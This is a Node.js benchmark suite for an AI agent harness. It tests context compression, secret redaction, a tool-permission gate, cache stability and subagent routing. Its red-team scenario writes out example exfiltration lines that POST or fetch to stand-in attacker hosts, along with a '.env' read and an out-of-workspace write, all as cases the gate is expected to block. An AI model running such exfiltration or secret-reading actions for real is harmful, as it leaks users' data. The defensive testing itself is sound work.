#!/usr/bin/env node
/**
 * JEVHarness / bench/suite.mjs
 *
 * Reproducible multi-scenario benchmark suite driving real JEVHarness v2 modules
 * with zero external network calls and zero LLM token consumption.
 *
 * Usage:
 *   node bench/suite.mjs [--json]
 */
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { pathToFileURL } from 'node:url'

import { bucketConfidence, buildStepQuestions, parseDecision } from '../shared/answers.mjs'
import { createChunkStore } from '../shared/chunk-store.mjs'
import { clearConditionalRulesCache, loadConditionalRules } from '../shared/conditional-rules.mjs'
import { estimateRoutingCost, evaluateToolGate } from '../shared/policy.mjs'
import { createSubgoalTracker } from '../shared/subgoal-tracker.mjs'

function makeSyntheticOutput(label, approxChars, salientLine) {
  const lines = [`=== ${label} START ===`]
  let len = lines[0].length + 1
  let idx = 1
  const salientAt = 24
  while (len < approxChars) {
    const line =
      idx === salientAt
        ? salientLine
        : `[${label}] line=${String(idx).padStart(4, '0')} module=core/engine status=ok payload=${'x'.repeat(64)}`
    lines.push(line)
    len += line.length + 1
    idx += 1
  }
  lines.push(`=== ${label} END ===`)
  return lines.join('\n')
}

/**
 * Scenario 1: Read-only large-output retrieval & visibility ladder compression.
 */
function runScenario1RetrievalCompression() {
  const store = createChunkStore({ maxChunksPerSession: 32 })
  const sessionId = 'bench-s1-retrieval'

  const payloads = [
    {
      kind: 'search_result',
      source: 'grep:handleAuth',
      sensitivity: 'internal',
      text: makeSyntheticOutput('GREP', 9400, 'src/auth/token.mjs:142: export async function verifySessionToken(req) {'),
    },
    {
      kind: 'command_output',
      source: 'pwsh:npm-test',
      sensitivity: 'internal',
      text: makeSyntheticOutput('TEST_LOG', 9200, 'FAIL test/auth.test.mjs:88 assertion failed: expected 200 got 401'),
    },
    {
      kind: 'file_read',
      source: 'src/auth/session-store.mjs',
      sensitivity: 'internal',
      text: makeSyntheticOutput('FILE_READ', 9100, 'export class SessionStore { // handles TTL eviction and sliding renewal'),
    },
    {
      kind: 'tool_output',
      source: 'git:diff-stat',
      sensitivity: 'internal',
      text: makeSyntheticOutput('GIT_DIFF', 8900, 'WARN: deprecated cipher suite detected in legacy middleware'),
    },
    {
      kind: 'file_read',
      source: 'src/auth/router.mjs',
      sensitivity: 'internal',
      text: makeSyntheticOutput('ROUTER', 9000, 'export function mountAuthRoutes(app) { // primary target under edit'),
    },
  ]

  const added = payloads.map((p, i) =>
    store.addChunk(sessionId, {
      kind: p.kind,
      access: 'read',
      sensitivity: p.sensitivity,
      source: p.source,
      fullText: p.text,
      turn: 1,
      step: i + 1,
    })
  )

  // Also add one secret chunk to verify shared retrieval pack redaction/exclusion
  store.addChunk(sessionId, {
    kind: 'file_read',
    access: 'read',
    sensitivity: 'secret',
    source: '.env.local',
    fullText: 'SECRET_API_KEY=sk-bench-do-not-leak',
    visibility: 'short_summary',
    turn: 1,
    step: 6,
  })

  const questions = buildStepQuestions(added.map((c) => c.id))
  const parsed = parseDecision({
    model: 'typesafe/jev-1.14.0',
    answers: {
      context_visibility: { type: 'choice', choice: 'short_summary', confidence: 0.88 },
      cache_prefix: { type: 'noul', noul: 0.91 },
      routing: { type: 'choice', choice: 'frontier', confidence: 0.82 },
      tools: { type: 'choice', choice: 'targeted', confidence: 0.86 },
      permissions: { type: 'choice', choice: 'allow', confidence: 0.95 },
      security: { type: 'score', score: 1, probabilities: [0.1, 0.85, 0.04, 0.01] },
      chunk_vis_c1: { type: 'choice', choice: 'hide', confidence: 0.92 },
      chunk_vis_c2: { type: 'choice', choice: 'long_summary', confidence: 0.89 },
      chunk_vis_c3: { type: 'choice', choice: 'short_summary', confidence: 0.85 },
      chunk_vis_c4: { type: 'choice', choice: 'hide', confidence: 0.9 },
      chunk_vis_c5: { type: 'choice', choice: 'long_summary', confidence: 0.87 },
    },
  })

  const visMap = {}
  for (const [id, v] of Object.entries(parsed.chunk_visibility)) {
    visMap[id] = v.level
  }
  store.applyVisibility(sessionId, visMap)

  const naiveChars = payloads.reduce((sum, p) => sum + p.text.length, 0)
  const digest = store.renderDigest(sessionId, { maxChars: 4000 })
  const digestChars = digest.length
  const compressionRatio = Number((1 - digestChars / naiveChars).toFixed(4))

  // On-demand lossless recall of hidden chunk c1
  const restored = store.readChunk(sessionId, 'c1', { level: 'full', offset: 0, limit: 20000 })
  const exactRestoreOk = Boolean(restored && restored.text === payloads[0].text && restored.truncated === false)

  // Shared read-only retrieval pack excludes secret chunks
  const pack = store.exportRetrievalPack(sessionId, { maxSensitivity: 'internal', maxChars: 6000 })
  const secretExcluded = pack.excludedBySensitivity === 1 && !pack.rendered.includes('sk-bench-do-not-leak')

  const checks = [
    { name: 'batched_questions_built', pass: Object.keys(questions).includes('chunk_vis_c5') },
    { name: 'naive_corpus_around_45kb', pass: naiveChars >= 43000 && naiveChars <= 50000 },
    { name: 'compression_ratio_gt_85pct', pass: compressionRatio >= 0.85 },
    { name: 'hidden_chunk_lossless_restore', pass: exactRestoreOk },
    { name: 'secret_excluded_from_pack', pass: secretExcluded },
  ]

  return {
    id: 'scenario-1-retrieval',
    name: 'Read-Only Large-Output Retrieval & Visibility Ladder',
    passed: checks.every((c) => c.pass),
    metrics: {
      chunkCount: added.length,
      naiveChars,
      digestChars,
      compressionRatio,
      exactRestoreOk,
      secretExcluded,
    },
    checks,
  }
}

/**
 * Scenario 2: Red-team security gate (10 offensive/benign cases, Precision & Recall).
 */
function runScenario2RedTeamGate() {
  const tempRoot = mkdtempSync(join(tmpdir(), 'jev-bench-s2-'))
  try {
    mkdirSync(join(tempRoot, 'scripts'), { recursive: true })
    writeFileSync(
      join(tempRoot, 'scripts', 'exfil.mjs'),
      'const res = await fetch("https://collector.attacker.example/dump", { method: "POST" });\n',
      'utf8'
    )
    writeFileSync(
      join(tempRoot, 'scripts', 'local-health.mjs'),
      'const res = await fetch("http://127.0.0.1:3425/health");\n',
      'utf8'
    )

    const sensitiveDecision = parseDecision({
      answers: {
        security: { type: 'score', score: 2, probabilities: [0.05, 0.1, 0.7, 0.15] },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
      },
    })

    // Bimodal tail-risk decision: mean ~1.25 but P(sensitive)+P(secret)=0.40 >= 0.35 -> escalated!
    const tailEscalatedDecision = parseDecision({
      answers: {
        security: { type: 'score', score: 1.25, probabilities: [0.55, 0.05, 0.05, 0.35] },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
      },
    })

    const publicDecision = parseDecision({
      answers: {
        security: { type: 'score', score: 0, probabilities: [0.92, 0.06, 0.02, 0] },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.95 },
      },
    })

    const cases = [
      {
        id: 'rt-01-dotenv-read',
        expectedBlock: true,
        expectedRule: 'deterministic-secret-path',
        input: { toolName: 'read', args: { file_path: '.env' }, cwd: tempRoot },
      },
      {
        id: 'rt-02-wxid-source-edit',
        expectedBlock: false,
        expectedRule: 'allow-default',
        input: {
          toolName: 'edit',
          args: {
            file_path: 'src/redactor.mjs',
            old_string: 'const pattern = /foo/',
            new_string: 'const pattern = /wxid_[a-z0-9]+/i',
          },
          cwd: tempRoot,
          decision: publicDecision,
        },
      },
      {
        id: 'rt-03-runcode-egress',
        expectedBlock: true,
        expectedRule: 'ptc-network-egress',
        input: {
          toolName: 'run_code',
          args: { code: 'await fetch("https://evil.example/leak?x=1")' },
          cwd: tempRoot,
          taskScope: 'default',
        },
      },
      {
        id: 'rt-04-runcode-loopback',
        expectedBlock: false,
        expectedRule: 'allow-default',
        input: {
          toolName: 'run_code',
          args: { code: 'await fetch("http://127.0.0.1:3425/v1/systemone")' },
          cwd: tempRoot,
          taskScope: 'default',
          decision: publicDecision,
        },
      },
      {
        id: 'rt-05-script-body-egress',
        expectedBlock: true,
        expectedRule: 'script-body-network-egress',
        input: {
          toolName: 'pwsh',
          args: { command: 'node scripts/exfil.mjs' },
          cwd: tempRoot,
          taskScope: 'default',
        },
      },
      {
        id: 'rt-06-script-body-loopback',
        expectedBlock: false,
        expectedRule: 'allow-default',
        input: {
          toolName: 'pwsh',
          args: { command: 'node scripts/local-health.mjs' },
          cwd: tempRoot,
          taskScope: 'default',
          decision: publicDecision,
        },
      },
      {
        id: 'rt-07-outside-workspace-write',
        expectedBlock: true,
        expectedRule: 'outside-workspace-write',
        input: {
          toolName: 'write',
          args: { file_path: '../escaped-artifact.txt', content: 'overwrite' },
          cwd: tempRoot,
          approvalDisabled: false,
        },
      },
      {
        id: 'rt-08-table4-unvetted-sensitive',
        expectedBlock: true,
        expectedRule: 'routing-trust-restricted',
        input: {
          toolName: 'subagent',
          args: { provider: 'openrouter', model: 'meta-llama/llama-3.3-70b' },
          cwd: tempRoot,
          decision: sensitiveDecision,
        },
      },
      {
        id: 'rt-09-table4-tail-risk-cheap-model',
        expectedBlock: true,
        expectedRule: 'routing-trust-restricted',
        input: {
          toolName: 'subagent',
          args: { provider: 'openai', model: 'gpt-4o-mini' },
          cwd: tempRoot,
          decision: tailEscalatedDecision,
        },
      },
      {
        id: 'rt-10-table4-public-open-weight',
        expectedBlock: false,
        expectedRule: 'allow-default',
        input: {
          toolName: 'subagent',
          args: { provider: 'openrouter', model: 'qwen-2.5-coder-32b' },
          cwd: tempRoot,
          decision: publicDecision,
        },
      },
    ]

    let tp = 0
    let fp = 0
    let tn = 0
    let fn = 0
    const caseResults = []

    for (const c of cases) {
      const verdict = evaluateToolGate(c.input)
      const actualBlock = verdict.kind !== 'allow'
      const ruleMatched = verdict.ruleId === c.expectedRule

      if (c.expectedBlock && actualBlock) tp += 1
      else if (!c.expectedBlock && actualBlock) fp += 1
      else if (!c.expectedBlock && !actualBlock) tn += 1
      else fn += 1

      caseResults.push({
        id: c.id,
        expectedBlock: c.expectedBlock,
        actualKind: verdict.kind,
        ruleId: verdict.ruleId,
        pass: actualBlock === c.expectedBlock && ruleMatched,
      })
    }

    const precision = tp + fp > 0 ? Number((tp / (tp + fp)).toFixed(4)) : 1
    const recall = tp + fn > 0 ? Number((tp / (tp + fn)).toFixed(4)) : 1
    const accuracy = Number(((tp + tn) / cases.length).toFixed(4))

    const checks = [
      { name: 'ten_redteam_cases_evaluated', pass: cases.length === 10 },
      { name: 'tail_risk_escalation_triggered', pass: tailEscalatedDecision.security?.escalated === true },
      { name: 'precision_100pct', pass: precision === 1 },
      { name: 'recall_100pct', pass: recall === 1 },
      { name: 'all_rule_ids_exact', pass: caseResults.every((r) => r.pass) },
    ]

    return {
      id: 'scenario-2-redteam',
      name: 'Red-Team Security Gate (10 Cases)',
      passed: checks.every((c) => c.pass),
      metrics: {
        totalCases: cases.length,
        tp,
        fp,
        tn,
        fn,
        precision,
        recall,
        accuracy,
      },
      checks,
    }
  } finally {
    rmSync(tempRoot, { recursive: true, force: true })
  }
}

/**
 * Scenario 3: 20-step long session KV Cache prefix stability & conditional rules.
 */
function runScenario3CacheAndConditionalRules() {
  const tempRoot = mkdtempSync(join(tmpdir(), 'jev-bench-s3-'))
  try {
    clearConditionalRulesCache()
    mkdirSync(join(tempRoot, 'src', 'frontend'), { recursive: true })
    mkdirSync(join(tempRoot, 'src', 'backend'), { recursive: true })
    mkdirSync(join(tempRoot, '.jev', 'rules'), { recursive: true })

    writeFileSync(
      join(tempRoot, 'src', 'frontend', 'FOOTGUNS.md'),
      'Avoid layout thrashing inside scroll listeners.\n',
      'utf8'
    )
    writeFileSync(
      join(tempRoot, 'src', 'backend', 'FOOTGUNS.md'),
      'Always pass explicit query timeouts to DB pool calls.\n',
      'utf8'
    )
    writeFileSync(
      join(tempRoot, '.jev', 'rules', 'frontend-style.md'),
      '---\nname: frontend-style\npaths:\n  - src/frontend/**\npriority: 20\n---\nUse CSS variables for dark/light theming.\n',
      'utf8'
    )
    writeFileSync(
      join(tempRoot, '.jev', 'rules', 'summary-format.md'),
      '---\nname: summary-format\nkeywords:\n  - summary\n  - report\npriority: 10\n---\nEmit concise bullet tables with exact metrics.\n',
      'utf8'
    )
    writeFileSync(
      join(tempRoot, '.jev', 'rules', 'verify-tests.md'),
      '---\nname: verify-tests\ntools:\n  - pwsh\npriority: 15\n---\nRun node --test after modifying behavior.\n',
      'utf8'
    )

    // Build 20 steps: 8 frontend retrieval steps, 6 backend steps, 6 frontend+summary/test steps
    const steps = []
    for (let i = 1; i <= 20; i += 1) {
      if (i <= 8) {
        steps.push({
          step: i,
          goal: 'inspect frontend component tree',
          activePaths: ['src/frontend/App.tsx'],
          recentTools: ['read', 'grep'],
          expectedRuleIds: ['rule:.jev/rules/frontend-style.md', 'footgun:src/frontend/FOOTGUNS.md'],
          cacheReuseProb: i === 1 ? 0.2 : 0.88 + (i % 3) * 0.02, // jittery raw confidence
          visConf: 0.78 + (i % 4) * 0.03, // stays inside 'high' bucket
        })
      } else if (i <= 14) {
        steps.push({
          step: i,
          goal: 'refactor backend auth handler',
          activePaths: ['src/backend/auth.mjs'],
          recentTools: ['read', 'grep'],
          expectedRuleIds: ['footgun:src/backend/FOOTGUNS.md'],
          cacheReuseProb: i === 9 ? 0.25 : 0.86 + (i % 3) * 0.02,
          visConf: 0.8 + (i % 3) * 0.02,
        })
      } else {
        steps.push({
          step: i,
          goal: 'prepare final summary report and verify tests',
          activePaths: ['src/frontend/Dashboard.tsx'],
          recentTools: ['pwsh', 'read'],
          expectedRuleIds: [
            'rule:.jev/rules/frontend-style.md',
            'rule:.jev/rules/verify-tests.md',
            'rule:.jev/rules/summary-format.md',
            'footgun:src/frontend/FOOTGUNS.md',
          ],
          cacheReuseProb: i === 15 ? 0.3 : 0.9,
          visConf: 0.82 + (i % 2) * 0.05,
        })
      }
    }

    let frozenPrefix = null
    let frozenHits = 0
    let ruleExactMatches = 0
    let determinismChecksPassed = 0

    for (const st of steps) {
      const dec = parseDecision({
        answers: {
          context_visibility: { type: 'choice', choice: 'short_summary', confidence: st.visConf },
          cache_prefix: { type: 'noul', noul: st.cacheReuseProb },
          routing: { type: 'choice', choice: 'frontier', confidence: 0.85 },
          tools: { type: 'choice', choice: 'targeted', confidence: 0.84 },
          permissions: { type: 'choice', choice: 'allow', confidence: 0.92 },
          security: { type: 'score', score: 1, probabilities: [0.1, 0.85, 0.04, 0.01] },
        },
      })

      const cond1 = loadConditionalRules({
        cwd: tempRoot,
        goal: st.goal,
        activePaths: st.activePaths,
        recentTools: st.recentTools,
      })
      const cond2 = loadConditionalRules({
        cwd: tempRoot,
        goal: st.goal,
        activePaths: st.activePaths,
        recentTools: st.recentTools,
      })

      if (cond1.rendered === cond2.rendered) determinismChecksPassed += 1

      const actualIds = cond1.rules.map((r) => r.id)
      const exactMatch =
        actualIds.length === st.expectedRuleIds.length &&
        actualIds.every((id, idx) => id === st.expectedRuleIds[idx])
      if (exactMatch) ruleExactMatches += 1

      // Bucketed header eliminates numeric jitter across steps
      const header = [
        '[JeV harness · per-step decision]',
        `vis=${dec.context_visibility.level}(${bucketConfidence(dec.context_visibility.confidence)})`,
        `route=${dec.routing.value}(${bucketConfidence(dec.routing.confidence)})`,
        `tools=${dec.tools.value}(${bucketConfidence(dec.tools.confidence)})`,
        `sec=${dec.security.level}`,
      ].join(' | ')

      const prefixBlock = `${header}\n${cond1.rendered}`

      if (dec.cache_prefix.reuse && frozenPrefix === prefixBlock) {
        frozenHits += 1
      } else {
        frozenPrefix = prefixBlock
      }
    }

    const cacheFreezeRate = Number((frozenHits / steps.length).toFixed(4))
    const ruleHitRate = Number((ruleExactMatches / steps.length).toFixed(4))

    const checks = [
      { name: 'twenty_steps_simulated', pass: steps.length === 20 },
      { name: 'cache_freeze_rate_ge_75pct', pass: cacheFreezeRate >= 0.75 },
      { name: 'conditional_rule_hit_rate_100pct', pass: ruleHitRate === 1 },
      { name: 'conditional_rules_deterministic', pass: determinismChecksPassed === 20 },
    ]

    return {
      id: 'scenario-3-cache-rules',
      name: '20-Step KV Cache Stability & Conditional Rules',
      passed: checks.every((c) => c.pass),
      metrics: {
        totalSteps: steps.length,
        cacheFrozenHits: frozenHits,
        cacheFreezeRate,
        ruleExactMatches,
        ruleHitRate,
        determinismChecksPassed,
      },
      checks,
    }
  } finally {
    clearConditionalRulesCache()
    rmSync(tempRoot, { recursive: true, force: true })
  }
}

/**
 * Scenario 4: §II.A routing cost worked examples & concurrent RW lock / subgoal dedup.
 */
function runScenario4RoutingAndConcurrency() {
  // Part A: §II.A cost matrix across regimes
  const paperExample = estimateRoutingCost({
    contextTokens: 0.65,
    outputTokens: 0.12,
    readTokens: 0.23,
  })
  const heavyContextRead = estimateRoutingCost({
    contextTokens: 1.2,
    outputTokens: 0.05,
    readTokens: 0.4,
  })
  const freshHeavyOutput = estimateRoutingCost({
    contextTokens: 0.02,
    outputTokens: 0.5,
    readTokens: 0.02,
  })
  const ultraCheapWorker = estimateRoutingCost({
    contextTokens: 0.1,
    outputTokens: 0.4,
    readTokens: 0.05,
    frontierIn: 5,
    frontierOut: 25,
    cheapIn: 0.25,
    cheapOut: 1.0,
  })

  // Part B: Concurrent RW lock & subgoal deduplication
  const tracker = createSubgoalTracker({ dedupThreshold: 0.78 })
  const sid = 'bench-s4-concurrency'

  // Concurrent read-read on overlapping path must succeed
  const r1 = tracker.registerSubgoal(sid, {
    id: 'sg-read-1',
    description: 'Audit auth middleware exports',
    prompt: 'Inspect src/auth/middleware.mjs exports and callers',
    access: 'read',
    paths: ['src/auth'],
  })
  const r2 = tracker.registerSubgoal(sid, {
    id: 'sg-read-2',
    description: 'Check token parser edge cases',
    prompt: 'Inspect src/auth/token.mjs error handling',
    access: 'read',
    paths: ['src/auth/token.mjs'],
  })

  // Write on overlapping path while reads are in_flight must conflict
  const wConflictOnRead = tracker.registerSubgoal(sid, {
    id: 'sg-write-blocked',
    description: 'Refactor auth token parser',
    prompt: 'Rewrite src/auth/token.mjs',
    access: 'write',
    paths: ['src/auth/token.mjs'],
  })

  // Disjoint write paths succeed concurrently
  const wDisjointA = tracker.registerSubgoal(sid, {
    id: 'sg-write-a',
    description: 'Update billing invoice formatter',
    prompt: 'Edit src/billing/invoice.mjs formatting',
    access: 'write',
    paths: ['src/billing/invoice.mjs'],
  })
  const wDisjointB = tracker.registerSubgoal(sid, {
    id: 'sg-write-b',
    description: 'Update telemetry serializer',
    prompt: 'Edit shared/telemetry.mjs serialization',
    access: 'write',
    paths: ['shared/telemetry.mjs'],
  })
  // Write-write conflict on same path
  const wConflictOnWrite = tracker.registerSubgoal(sid, {
    id: 'sg-write-dup-path',
    description: 'Clean up invoice currency rounding',
    prompt: 'Adjust src/billing/invoice.mjs rounding',
    access: 'write',
    paths: ['src/billing/invoice.mjs'],
  })

  // Complete sg-read-1 so we test both in_flight AND completed deduplication
  tracker.completeSubgoal(sid, 'sg-read-1', {
    status: 'completed',
    summary: 'Found 4 exported handlers in middleware.mjs',
  })

  const incomingRequests = [
    // Duplicate of completed sg-read-1
    {
      description: 'Audit auth middleware exports',
      prompt: 'Inspect src/auth/middleware.mjs exports and callers',
      paths: ['src/auth'],
    },
    // Duplicate of in_flight sg-read-2
    {
      description: 'Check token parser edge cases',
      prompt: 'Inspect src/auth/token.mjs error handling',
      paths: ['src/auth/token.mjs'],
    },
    // Duplicate of in_flight sg-write-a
    {
      description: 'Update billing invoice formatter',
      prompt: 'Edit src/billing/invoice.mjs formatting',
      paths: ['src/billing/invoice.mjs'],
    },
    // Duplicate of in_flight sg-write-b
    {
      description: 'Update telemetry serializer',
      prompt: 'Edit shared/telemetry.mjs serialization',
      paths: ['shared/telemetry.mjs'],
    },
    // Distinct new subgoals (6 unique)
    {
      description: 'Analyze SQLite WAL checkpoint cadence',
      prompt: 'Inspect storage/sqlite.mjs checkpoint settings',
      paths: ['storage/sqlite.mjs'],
    },
    {
      description: 'Benchmark JSONL parser throughput',
      prompt: 'Profile bench/suite.mjs execution latency',
      paths: ['bench/suite.mjs'],
    },
    {
      description: 'Verify Windows path normalization',
      prompt: 'Check drive letter case handling in policy.mjs',
      paths: ['shared/policy.mjs'],
    },
    {
      description: 'Review HTML dashboard XSS escaping',
      prompt: 'Audit scripts/jev-report.mjs escapeHtml coverage',
      paths: ['scripts/jev-report.mjs'],
    },
    {
      description: 'Check subagent timeout cancellation',
      prompt: 'Inspect AbortSignal wiring in gateway.mjs',
      paths: ['shared/gateway.mjs'],
    },
    {
      description: 'Document v2 CLI flags in README',
      prompt: 'Verify CLI options for jev-report and bench suite',
      paths: ['README.md'],
    },
  ]

  let duplicateDispatchesSaved = 0
  let uniqueDispatchesAllowed = 0
  for (const req of incomingRequests) {
    const check = tracker.checkDuplicate(sid, req)
    if (check.duplicate) {
      duplicateDispatchesSaved += 1
    } else {
      uniqueDispatchesAllowed += 1
    }
  }

  const checks = [
    {
      name: 'paper_example_exact_4_15_vs_6_19',
      pass:
        paperExample.pureFrontier === 4.15 &&
        paperExample.routed === 6.19 &&
        paperExample.cheaperPath === 'pureFrontier',
    },
    {
      name: 'heavy_context_prefers_frontier',
      pass: heavyContextRead.cheaperPath === 'pureFrontier',
    },
    {
      name: 'fresh_heavy_output_prefers_routed',
      pass: freshHeavyOutput.cheaperPath === 'routed' && freshHeavyOutput.savingsRatio > 0.15,
    },
    {
      name: 'ultra_cheap_worker_saves_gt_65pct',
      pass: ultraCheapWorker.cheaperPath === 'routed' && ultraCheapWorker.savingsRatio > 0.65,
    },
    {
      name: 'read_read_concurrent_allowed',
      pass: r1.registered === true && r2.registered === true,
    },
    {
      name: 'write_blocked_by_active_read',
      pass: wConflictOnRead.registered === false && wConflictOnRead.conflict === true,
    },
    {
      name: 'disjoint_writes_concurrent_allowed',
      pass: wDisjointA.registered === true && wDisjointB.registered === true,
    },
    {
      name: 'write_write_conflict_detected',
      pass: wConflictOnWrite.registered === false && wConflictOnWrite.conflict === true,
    },
    {
      name: 'subgoal_dedup_saved_4_of_10',
      pass: duplicateDispatchesSaved === 4 && uniqueDispatchesAllowed === 6,
    },
  ]

  return {
    id: 'scenario-4-routing-concurrency',
    name: '§II.A Routing Cost Matrix & Concurrent RW Lock / Dedup',
    passed: checks.every((c) => c.pass),
    metrics: {
      paperWorkedExample: paperExample,
      freshHeavyOutput,
      ultraCheapWorkerSavings: ultraCheapWorker.savingsRatio,
      duplicateDispatchesSaved,
      uniqueDispatchesAllowed,
      dedupSaveRate: Number((duplicateDispatchesSaved / incomingRequests.length).toFixed(4)),
    },
    checks,
  }
}

export function runBenchmarkSuite() {
  const startedAt = Date.now()
  const scenarios = [
    runScenario1RetrievalCompression(),
    runScenario2RedTeamGate(),
    runScenario3CacheAndConditionalRules(),
    runScenario4RoutingAndConcurrency(),
  ]
  const durationMs = Date.now() - startedAt
  const allPassed = scenarios.every((s) => s.passed)

  return {
    suite: 'JEVHarness v2 Multi-Scenario Benchmark',
    generatedAt: new Date().toISOString(),
    durationMs,
    passed: allPassed,
    passedCount: scenarios.filter((s) => s.passed).length,
    totalCount: scenarios.length,
    scenarios,
  }
}

export function formatMarkdownTable(result) {
  const lines = [
    `# ${result.suite}`,
    '',
    `Status: **${result.passed ? 'PASS' : 'FAIL'}** (${result.passedCount}/${result.totalCount} scenarios passed in ${result.durationMs} ms)`,
    '',
    '| # | Scenario | Status | Key Metrics |',
    '|---|----------|--------|-------------|',
  ]

  result.scenarios.forEach((sc, idx) => {
    const m = sc.metrics
    let summary = ''
    if (sc.id === 'scenario-1-retrieval') {
      summary = `${m.naiveChars} -> ${m.digestChars} chars (-${(m.compressionRatio * 100).toFixed(1)}%), exactRestore=${m.exactRestoreOk}`
    } else if (sc.id === 'scenario-2-redteam') {
      summary = `Precision=${(m.precision * 100).toFixed(1)}%, Recall=${(m.recall * 100).toFixed(1)}% (TP=${m.tp} FP=${m.fp} TN=${m.tn} FN=${m.fn})`
    } else if (sc.id === 'scenario-3-cache-rules') {
      summary = `CacheFreeze=${(m.cacheFreezeRate * 100).toFixed(1)}% (${m.cacheFrozenHits}/${m.totalSteps}), RuleHit=${(m.ruleHitRate * 100).toFixed(1)}%`
    } else if (sc.id === 'scenario-4-routing-concurrency') {
      summary = `Paper: ${m.paperWorkedExample.pureFrontier} vs ${m.paperWorkedExample.routed} (${m.paperWorkedExample.cheaperPath}), WorkerSave=${(m.ultraCheapWorkerSavings * 100).toFixed(1)}%, DedupSaved=${m.duplicateDispatchesSaved}/10`
    }

    lines.push(`| ${idx + 1} | ${sc.name} | ${sc.passed ? 'PASS' : 'FAIL'} | ${summary} |`)
  })

  const failedChecks = result.scenarios.flatMap((sc) =>
    sc.checks.filter((c) => !c.pass).map((c) => `- [${sc.id}] ${c.name}`)
  )
  if (failedChecks.length > 0) {
    lines.push('', '## Failed Checks', ...failedChecks)
  }

  return lines.join('\n')
}

const isEntrypoint =
  typeof process.argv[1] === 'string' &&
  pathToFileURL(resolve(process.argv[1])).href === import.meta.url

if (isEntrypoint) {
  const asJson = process.argv.slice(2).includes('--json')
  const result = runBenchmarkSuite()
  if (asJson) {
    console.log(JSON.stringify(result, null, 2))
  } else {
    console.log(formatMarkdownTable(result))
  }
  if (!result.passed) {
    process.exitCode = 1
  }
}
